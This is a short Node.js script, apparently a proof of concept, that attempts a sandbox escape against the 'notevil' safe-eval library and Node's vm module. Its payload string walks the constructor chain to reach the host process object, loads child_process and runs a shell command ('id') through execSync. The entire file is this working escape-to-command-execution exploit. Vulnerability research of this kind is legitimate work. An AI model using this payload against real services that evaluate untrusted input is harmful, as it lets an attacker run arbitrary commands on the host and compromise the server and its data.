const vm = require('vm');
let safeEval;
try {
  safeEval = require('./node_modules/notevil').eval;
} catch (e) {
  console.log("Could not load notevil directly from node_modules, falling back to just showing vm runInContext.");
}

const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()';

try {
  const sandbox = { safeEval: safeEval || eval, orderLinesData };
  vm.createContext(sandbox);
  const result = vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 });
  console.log("Result:", result);
} catch (e) {
  console.log("Error:", e.message);
}
